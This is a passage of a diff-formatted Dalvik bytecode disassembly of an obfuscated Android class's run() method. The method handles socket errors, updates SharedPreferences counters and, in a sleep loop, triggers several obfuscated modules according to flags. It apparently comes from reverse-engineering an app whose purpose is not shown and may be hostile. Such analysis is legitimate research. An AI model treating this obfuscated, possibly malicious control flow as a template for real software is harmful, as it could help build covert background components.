+	952     (00000ee2) invoke-virtual       v2, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+	953     (00000ee8) move-result-object   v2
+	954     (00000eea) invoke-static        v2, Lcom/mixio/tosh/aprl/aetn/ate;->b(Ljava/lang/String;)V
+	955     (00000ef0) invoke-virtual       v1, Ljava/net/SocketException;->getMessage()Ljava/lang/String;
+	956     (00000ef6) goto                 +3d
+	e40:f13
+	(Ljava/lang/Exception; -> f30 run-BB@0xf30)
+
+run-BB@0xef8 : [ run-BB@0xeae ]
+	957     (00000ef8) move-object          v4, v1
+	958     (00000efa) move-object/from16   v18, v8
+	959     (00000efe) move-object/from16   v24, v9
+	960     (00000f02) move-object/from16   v29, v11
+	961     (00000f06) const/16             v6, 512
+	962     (00000f0a) const/4              v9, -1
+	963     (00000f0c) const/4              v1, 0
+	964     (00000f0e) goto                 -30
+	e40:f13
+	(Ljava/lang/Exception; -> f30 run-BB@0xf30)
+
+run-BB@0xf10 : [ run-BB@0xf1a run-BB@0xf1c ]
+	965     (00000f10) iget-boolean         v1, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->f Z
+	966     (00000f14) const/4              v5, 1
+	967     (00000f16) if-eq                v1, v5, +3
+
+run-BB@0xf1a : [ run-BB@0xf70 ]
+	968     (00000f1a) goto                 +2b
+
+run-BB@0xf1c : [ run-BB@0x898 ]
+	969     (00000f1c) move-object          v1, v4
+	970     (00000f1e) move-object/from16   v8, v18
+	971     (00000f22) move-object/from16   v9, v24
+	972     (00000f26) move-object/from16   v11, v29
+	973     (00000f2a) const/4              v12, 1
+	974     (00000f2c) goto/16              -34a
+
+run-BB@0xf30 : [ run-BB@0xf48 ]
+	975     (00000f30) move-exception       v0
+	976     (00000f32) goto                 +b
+
+run-BB@0xf34 : [ run-BB@0xf70 ]
+	977     (00000f34) move-object/from16   v18, v8
+	978     (00000f38) move-object/from16   v24, v9
+	979     (00000f3c) goto                 +1a
+
+run-BB@0xf3e : [ run-BB@0xf48 ]
+	980     (00000f3e) move-exception       v0
+	981     (00000f40) move-object/from16   v18, v8
+	982     (00000f44) move-object/from16   v24, v9
+
+run-BB@0xf48 : [ run-BB@0xfb4 ]
+	983     (00000f48) move-object          v1, v0
+	984     (00000f4a) goto                 +35
+
+run-BB@0xf4c : [ run-BB@0x54a ]
+	985     (00000f4c) const/4              v4, 0
+	986     (00000f4e) const/16             v6, 512
+	987     (00000f52) const/4              v6, 4
+	988     (00000f54) goto/16              -505
+
+run-BB@0xf58 : [ run-BB@0xf70 ]
+	989     (00000f58) move-object/from16   v18, v8
+	990     (00000f5c) move-object/from16   v24, v9
+	991     (00000f60) move-object/from16   v20, v12
+	992     (00000f64) move-object/from16   v25, v15
+	993     (00000f68) move-object/from16   v19, v21
+	994     (00000f6c) move-object/from16   v21, v11
+
+run-BB@0xf70 : [ run-BB@0x1068 ]
+	995     (00000f70) move-object/from16   v3, v20
+	996     (00000f74) move-object/from16   v5, v25
+	997     (00000f78) goto/16              +78
+
+run-BB@0xf7c : [ run-BB@0xf48 ]
+	998     (00000f7c) move-exception       v0
+	999     (00000f7e) move-object/from16   v18, v8
+	1000    (00000f82) move-object/from16   v24, v9
+	1001    (00000f86) move-object/from16   v20, v12
+	1002    (00000f8a) move-object/from16   v25, v15
+	1003    (00000f8e) move-object/from16   v19, v21
+	1004    (00000f92) move-object/from16   v21, v11
+	1005    (00000f96) goto                 -27
+
+run-BB@0xf98 : [ run-BB@0xf48 ]
+	1006    (00000f98) move-exception       v0
+	1007    (00000f9a) move-object/from16   v19, v4
+	1008    (00000f9e) move-object/from16   v18, v8
+	1009    (00000fa2) move-object/from16   v24, v9
+	1010    (00000fa6) move-object/from16   v21, v11
+	1011    (00000faa) move-object/from16   v20, v12
+	1012    (00000fae) move-object/from16   v25, v15
+	1013    (00000fb2) goto                 -35
+
+run-BB@0xfb4 : [ run-BB@0xfc8 run-BB@0xffa ]
+	1014    (00000fb4) invoke-virtual       v1, Ljava/lang/Exception;->getMessage()Ljava/lang/String;
+	1015    (00000fba) move-result-object   v2
+	1016    (00000fbc) invoke-virtual       v2, v13, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
+	1017    (00000fc2) move-result          v2
+	1018    (00000fc4) if-nez               v2, +1b
+	fb4:fc3
+	(Ljava/lang/Exception; -> 1078 run-BB@0x1078)
+
+run-BB@0xfc8 : [ run-BB@0xfd4 ]
+	1019    (00000fc8) invoke-virtual       v1, Ljava/lang/Exception;->getMessage()Ljava/lang/String;
+	1020    (00000fce) move-result-object   v2
+	1021    (00000fd0) move-object/from16   v3, v20
+	fc8:fcf
+	(Ljava/lang/Exception; -> fec run-BB@0xfec)
+
+run-BB@0xfd4 : [ run-BB@0xfe0 run-BB@0xfe2 ]
+	1022    (00000fd4) invoke-virtual       v2, v3, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
+	1023    (00000fda) move-result          v2
+	1024    (00000fdc) if-eqz               v2, +3
+	fd4:fdb
+	(Ljava/lang/Exception; -> fe8 run-BB@0xfe8)
+
+run-BB@0xfe0 : [ run-BB@0xffe ]
+	1025    (00000fe0) goto                 +f
+
+run-BB@0xfe2 : [ run-BB@0x103c ]
+	1026    (00000fe2) move-object/from16   v5, v25
+	1027    (00000fe6) goto                 +2b
+
+run-BB@0xfe8 : [ run-BB@0xff2 ]
+	1028    (00000fe8) move-exception       v0
+	1029    (00000fea) goto                 +4
+
+run-BB@0xfec : [ run-BB@0xff2 ]
+	1030    (00000fec) move-exception       v0
+	1031    (00000fee) move-object/from16   v3, v20
+
+run-BB@0xff2 : [ run-BB@0x1098 ]
+	1032    (00000ff2) move-object          v1, v0
+	1033    (00000ff4) move-object/from16   v5, v25
+	1034    (00000ff8) goto                 +50
+
+run-BB@0xffa : [ run-BB@0xffe ]
+	1035    (00000ffa) move-object/from16   v3, v20
+
+run-BB@0xffe : [ run-BB@0x100c ]
+	1036    (00000ffe) sget-object          v2, Lcom/mixio/tosh/aprl/aetn/ate;->f Landroid/content/SharedPreferences$Editor;
+	1037    (00001002) sget-object          v4, Lcom/mixio/tosh/aprl/aetn/ate;->e Landroid/content/SharedPreferences;
+	1038    (00001006) move-object/from16   v5, v25
+	1039    (0000100a) const/4              v6, 0
+	ffe:1005
+	(Ljava/lang/Exception; -> 1074 run-BB@0x1074)
+
+run-BB@0x100c : [ run-BB@0x103c ]
+	1040    (0000100c) invoke-interface     v4, v5, v6, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String; I)I
+	1041    (00001012) move-result          v4
+	1042    (00001014) const/4              v6, 1
+	1043    (00001016) add-int/2addr        v4, v6
+	1044    (00001018) invoke-interface     v2, v5, v4, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String; I)Landroid/content/SharedPreferences$Editor;
+	1045    (0000101e) sget-object          v2, Lcom/mixio/tosh/aprl/aetn/ate;->f Landroid/content/SharedPreferences$Editor;
+	1046    (00001022) invoke-interface     v2, Landroid/content/SharedPreferences$Editor;->commit()Z
+	1047    (00001028) sget-object          v2, Lcom/mixio/tosh/aprl/aetn/ate;->e Landroid/content/SharedPreferences;
+	1048    (0000102c) const/4              v4, 0
+	1049    (0000102e) invoke-interface     v2, v5, v4, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String; I)I
+	1050    (00001034) move-result          v2
+	1051    (00001036) invoke-static        v2, Ljava/lang/String;->valueOf(I)Ljava/lang/String;
+	100c:106d
+	(Ljava/lang/Exception; -> 1070 run-BB@0x1070)
+
+run-BB@0x103c : [ run-BB@0x1068 ]
+	1052    (0000103c) sput-wide            v16, Lcom/mixio/tosh/aprl/aetn/ate;->i J
+	1053    (00001040) new-instance         v2, Ljava/lang/StringBuilder;
+	1054    (00001044) invoke-direct        v2, Ljava/lang/StringBuilder;-><init>()V
+	1055    (0000104a) const-string         v4, 'Error LAST'
+	1056    (0000104e) invoke-virtual       v2, v4, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+	1057    (00001054) invoke-virtual       v1, Ljava/lang/Exception;->getMessage()Ljava/lang/String;
+	1058    (0000105a) move-result-object   v1
+	1059    (0000105c) invoke-virtual       v2, v1, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+	1060    (00001062) invoke-virtual       v2, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+	100c:106d
+	(Ljava/lang/Exception; -> 1070 run-BB@0x1070)
+
+run-BB@0x1068 : [ run-BB@0x1102 ]
+	1061    (00001068) invoke-virtual/range v19, Ljava/net/Socket;->close()V
+	1062    (0000106e) goto                 +4a
+
+run-BB@0x1070 : [ run-BB@0x1096 ]
+	1063    (00001070) move-exception       v0
+	1064    (00001072) goto                 +12
+
+run-BB@0x1074 : [ run-BB@0x107e ]
+	1065    (00001074) move-exception       v0
+	1066    (00001076) goto                 +4
+
+run-BB@0x1078 : [ run-BB@0x107e ]
+	1067    (00001078) move-exception       v0
+	1068    (0000107a) move-object/from16   v3, v20
+
+run-BB@0x107e : [ run-BB@0x1096 ]
+	1069    (0000107e) move-object/from16   v5, v25
+	1070    (00001082) goto                 +a
+
+run-BB@0x1084 : [ run-BB@0x1096 ]
+	1071    (00001084) move-exception       v0
+	1072    (00001086) move-object/from16   v18, v8
+	1073    (0000108a) move-object/from16   v24, v9
+	1074    (0000108e) move-object/from16   v21, v11
+	1075    (00001092) move-object          v3, v12
+	1076    (00001094) move-object          v5, v15
+
+run-BB@0x1096 : [ run-BB@0x1098 ]
+	1077    (00001096) move-object          v1, v0
+
+run-BB@0x1098 : [ run-BB@0x10ac run-BB@0x10c0 ]
+	1078    (00001098) invoke-virtual       v1, Ljava/lang/Exception;->getMessage()Ljava/lang/String;
+	1079    (0000109e) move-result-object   v2
+	1080    (000010a0) invoke-virtual       v2, v13, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
+	1081    (000010a6) move-result          v2
+	1082    (000010a8) if-nez               v2, +c
+
+run-BB@0x10ac : [ run-BB@0x10c0 run-BB@0x10f8 ]
+	1083    (000010ac) invoke-virtual       v1, Ljava/lang/Exception;->getMessage()Ljava/lang/String;
+	1084    (000010b2) move-result-object   v2
+	1085    (000010b4) invoke-virtual       v2, v3, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
+	1086    (000010ba) move-result          v2
+	1087    (000010bc) if-eqz               v2, +1e
+
+run-BB@0x10c0 : [ run-BB@0x10f8 ]
+	1088    (000010c0) sget-object          v2, Lcom/mixio/tosh/aprl/aetn/ate;->f Landroid/content/SharedPreferences$Editor;
+	1089    (000010c4) sget-object          v3, Lcom/mixio/tosh/aprl/aetn/ate;->e Landroid/content/SharedPreferences;
+	1090    (000010c8) const/4              v4, 0
+	1091    (000010ca) invoke-interface     v3, v5, v4, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String; I)I
+	1092    (000010d0) move-result          v3
+	1093    (000010d2) const/4              v6, 1
+	1094    (000010d4) add-int/2addr        v3, v6
+	1095    (000010d6) invoke-interface     v2, v5, v3, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String; I)Landroid/content/SharedPreferences$Editor;
+	1096    (000010dc) sget-object          v2, Lcom/mixio/tosh/aprl/aetn/ate;->f Landroid/content/SharedPreferences$Editor;
+	1097    (000010e0) invoke-interface     v2, Landroid/content/SharedPreferences$Editor;->commit()Z
+	1098    (000010e6) sget-object          v2, Lcom/mixio/tosh/aprl/aetn/ate;->e Landroid/content/SharedPreferences;
+	1099    (000010ea) invoke-interface     v2, v5, v4, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String; I)I
+	1100    (000010f0) move-result          v2
+	1101    (000010f2) invoke-static        v2, Ljava/lang/String;->valueOf(I)Ljava/lang/String;
+
+run-BB@0x10f8 : [ run-BB@0x1102 ]
+	1102    (000010f8) sput-wide            v16, Lcom/mixio/tosh/aprl/aetn/ate;->i J
+	1103    (000010fc) invoke-virtual       v1, Ljava/lang/Exception;->getMessage()Ljava/lang/String;
+
+run-BB@0x1102 : [ run-BB@0x1114 run-BB@0x1122 ]
+	1104    (00001102) sget-object          v1, Lcom/mixio/tosh/aprl/aetn/ate;->j Lb/b/a/a/g/a;
+	1105    (00001106) iget-object          v1, v1, Lb/b/a/a/g/a;->b Lb/b/a/a/g/b;
+	1106    (0000110a) iget-boolean         v1, v1, Lb/b/a/a/g/b;->c Z
+	1107    (0000110e) const/4              v2, 1
+	1108    (00001110) if-ne                v1, v2, +9
+	1102:11fd
+	(Ljava/lang/Exception; -> 11fe run-BB@0x11fe)
+
+run-BB@0x1114 : [ run-BB@0x1122 ]
+	1109    (00001114) iget-object          v1, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->p Lcom/mixio/tosh/aprl/aetn/ate;
+	1110    (00001118) iget-object          v1, v1, Lcom/mixio/tosh/aprl/aetn/ate;->J Lb/b/a/a/j/a;
+	1111    (0000111c) invoke-virtual       v1, Lb/b/a/a/j/a;->a()V
+	1102:11fd
+	(Ljava/lang/Exception; -> 11fe run-BB@0x11fe)
+
+run-BB@0x1122 : [ run-BB@0x1134 run-BB@0x1142 ]
+	1112    (00001122) sget-object          v1, Lcom/mixio/tosh/aprl/aetn/ate;->j Lb/b/a/a/g/a;
+	1113    (00001126) iget-object          v1, v1, Lb/b/a/a/g/a;->e Lb/b/a/a/g/b;
+	1114    (0000112a) iget-boolean         v1, v1, Lb/b/a/a/g/b;->c Z
+	1115    (0000112e) const/4              v2, 1
+	1116    (00001130) if-ne                v1, v2, +9
+	1102:11fd
+	(Ljava/lang/Exception; -> 11fe run-BB@0x11fe)
+
+run-BB@0x1134 : [ run-BB@0x1142 ]
+	1117    (00001134) iget-object          v1, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->p Lcom/mixio/tosh/aprl/aetn/ate;
+	1118    (00001138) iget-object          v1, v1, Lcom/mixio/tosh/aprl/aetn/ate;->M Lb/b/a/a/b/a;
+	1119    (0000113c) invoke-virtual       v1, Lb/b/a/a/b/a;->a()V
+	1102:11fd
+	(Ljava/lang/Exception; -> 11fe run-BB@0x11fe)
+
+run-BB@0x1142 : [ run-BB@0x1154 run-BB@0x1162 ]
+	1120    (00001142) sget-object          v1, Lcom/mixio/tosh/aprl/aetn/ate;->j Lb/b/a/a/g/a;
+	1121    (00001146) iget-object          v1, v1, Lb/b/a/a/g/a;->f Lb/b/a/a/g/b;
+	1122    (0000114a) iget-boolean         v1, v1, Lb/b/a/a/g/b;->c Z
+	1123    (0000114e) const/4              v2, 1
+	1124    (00001150) if-ne                v1, v2, +9
+	1102:11fd
+	(Ljava/lang/Exception; -> 11fe run-BB@0x11fe)
+
+run-BB@0x1154 : [ run-BB@0x1162 ]
+	1125    (00001154) iget-object          v1, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->p Lcom/mixio/tosh/aprl/aetn/ate;
+	1126    (00001158) iget-object          v1, v1, Lcom/mixio/tosh/aprl/aetn/ate;->I Lb/b/a/a/k/a;
+	1127    (0000115c) invoke-virtual       v1, Lb/b/a/a/k/a;->a()V
+	1102:11fd
+	(Ljava/lang/Exception; -> 11fe run-BB@0x11fe)
+
+run-BB@0x1162 : [ run-BB@0x1174 run-BB@0x1182 ]
+	1128    (00001162) sget-object          v1, Lcom/mixio/tosh/aprl/aetn/ate;->j Lb/b/a/a/g/a;
+	1129    (00001166) iget-object          v1, v1, Lb/b/a/a/g/a;->g Lb/b/a/a/g/b;
+	1130    (0000116a) iget-boolean         v1, v1, Lb/b/a/a/g/b;->c Z
+	1131    (0000116e) const/4              v2, 1
+	1132    (00001170) if-ne                v1, v2, +9
+	1102:11fd
+	(Ljava/lang/Exception; -> 11fe run-BB@0x11fe)
+
+run-BB@0x1174 : [ run-BB@0x1182 ]
+	1133    (00001174) iget-object          v1, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->p Lcom/mixio/tosh/aprl/aetn/ate;
+	1134    (00001178) iget-object          v1, v1, Lcom/mixio/tosh/aprl/aetn/ate;->L Lb/b/a/a/c/a;
+	1135    (0000117c) invoke-virtual       v1, Lb/b/a/a/c/a;->a()V
+	1102:11fd
+	(Ljava/lang/Exception; -> 11fe run-BB@0x11fe)
+
+run-BB@0x1182 : [ run-BB@0x1194 run-BB@0x11a4 ]
+	1136    (00001182) sget-object          v1, Lcom/mixio/tosh/aprl/aetn/ate;->j Lb/b/a/a/g/a;
+	1137    (00001186) iget-object          v1, v1, Lb/b/a/a/g/a;->k Lb/b/a/a/g/b;
+	1138    (0000118a) iget-boolean         v1, v1, Lb/b/a/a/g/b;->c Z
+	1139    (0000118e) const/4              v2, 1
+	1140    (00001190) if-ne                v1, v2, +a
+	1102:11fd
+	(Ljava/lang/Exception; -> 11fe run-BB@0x11fe)
+
+run-BB@0x1194 : [ run-BB@0x11b2 ]
+	1141    (00001194) iget-object          v1, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->p Lcom/mixio/tosh/aprl/aetn/ate;
+	1142    (00001198) iget-object          v1, v1, Lcom/mixio/tosh/aprl/aetn/ate;->N Lb/b/a/a/i/b;
+	1143    (0000119c) invoke-virtual       v1, Lb/b/a/a/i/b;->b()V
+	1144    (000011a2) goto                 +8
+	1102:11fd
+	(Ljava/lang/Exception; -> 11fe run-BB@0x11fe)
+
+run-BB@0x11a4 : [ run-BB@0x11b2 ]
+	1145    (000011a4) iget-object          v1, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->p Lcom/mixio/tosh/aprl/aetn/ate;
+	1146    (000011a8) iget-object          v1, v1, Lcom/mixio/tosh/aprl/aetn/ate;->N Lb/b/a/a/i/b;
+	1147    (000011ac) invoke-virtual       v1, Lb/b/a/a/i/b;->c()V
+	1102:11fd
+	(Ljava/lang/Exception; -> 11fe run-BB@0x11fe)
+
+run-BB@0x11b2 : [ run-BB@0x11c4 run-BB@0x11d2 ]
+	1148    (000011b2) sget-object          v1, Lcom/mixio/tosh/aprl/aetn/ate;->j Lb/b/a/a/g/a;
+	1149    (000011b6) iget-object          v1, v1, Lb/b/a/a/g/a;->l Lb/b/a/a/g/b;
+	1150    (000011ba) iget-boolean         v1, v1, Lb/b/a/a/g/b;->c Z
+	1151    (000011be) const/4              v2, 1
+	1152    (000011c0) if-ne                v1, v2, +9
+	1102:11fd
+	(Ljava/lang/Exception; -> 11fe run-BB@0x11fe)
+
+run-BB@0x11c4 : [ run-BB@0x11d2 ]
+	1153    (000011c4) iget-object          v1, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->p Lcom/mixio/tosh/aprl/aetn/ate;
+	1154    (000011c8) iget-object          v1, v1, Lcom/mixio/tosh/aprl/aetn/ate;->P Lb/b/a/a/l/a;
+	1155    (000011cc) invoke-virtual       v1, Lb/b/a/a/l/a;->a()V
+	1102:11fd
+	(Ljava/lang/Exception; -> 11fe run-BB@0x11fe)
+
+run-BB@0x11d2 : [ run-BB@0x11e4 run-BB@0x11f2 ]
+	1156    (000011d2) sget-object          v1, Lcom/mixio/tosh/aprl/aetn/ate;->j Lb/b/a/a/g/a;
+	1157    (000011d6) iget-object          v1, v1, Lb/b/a/a/g/a;->m Lb/b/a/a/g/b;
+	1158    (000011da) iget-boolean         v1, v1, Lb/b/a/a/g/b;->c Z
+	1159    (000011de) const/4              v2, 1
+	1160    (000011e0) if-ne                v1, v2, +9
+	1102:11fd
+	(Ljava/lang/Exception; -> 11fe run-BB@0x11fe)
+
+run-BB@0x11e4 : [ run-BB@0x11f2 ]
+	1161    (000011e4) iget-object          v1, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->p Lcom/mixio/tosh/aprl/aetn/ate;
+	1162    (000011e8) iget-object          v1, v1, Lcom/mixio/tosh/aprl/aetn/ate;->Q Lb/b/a/a/h/a;
+	1163    (000011ec) invoke-virtual       v1, Lb/b/a/a/h/a;->a()V
+	1102:11fd
+	(Ljava/lang/Exception; -> 11fe run-BB@0x11fe)
+
+run-BB@0x11f2 : [ run-BB@0x11fe ]
+	1164    (000011f2) sget-object          v1, Lcom/mixio/tosh/aprl/aetn/ate;->j Lb/b/a/a/g/a;
+	1165    (000011f6) iget-object          v1, v1, Lb/b/a/a/g/a;->n Lb/b/a/a/g/b;
+	1166    (000011fa) iget-boolean         v1, v1, Lb/b/a/a/g/b;->c Z
+	1102:11fd
+	(Ljava/lang/Exception; -> 11fe run-BB@0x11fe)
+
+run-BB@0x11fe : [ run-BB@0x121e ]
+	1167    (000011fe) sget-wide            v1, Lcom/mixio/tosh/aprl/aetn/ate;->i J
+	1168    (00001202) invoke-static        v1, v2, Ljava/lang/Thread;->sleep(J)V
+	1169    (00001208) goto                 +b
+	11fe:1207
+	(Ljava/lang/InterruptedException; -> 120a run-BB@0x120a)
+
+run-BB@0x120a : [ run-BB@0x121e ]
+	1170    (0000120a) move-exception       v0
+	1171    (0000120c) move-object          v1, v0
+	1172    (0000120e) invoke-virtual       v1, Ljava/lang/InterruptedException;->printStackTrace()V
+	1173    (00001214) sget-wide            v1, Lcom/mixio/tosh/aprl/aetn/ate;->i J
+	1174    (00001218) invoke-static        v1, v2, Ljava/lang/String;->valueOf(J)Ljava/lang/String;
+
+run-BB@0x121e : [ run-BB@0x34 ]
+	1175    (0000121e) move-object/from16   v8, v18
+	1176    (00001222) move-object/from16   v11, v21
+	1177    (00001226) move-object/from16   v9, v24
+	1178    (0000122a) goto/16              -8fb
+
+run-BB@0x122e : 
+	1179    (0000122e) return-void          
+
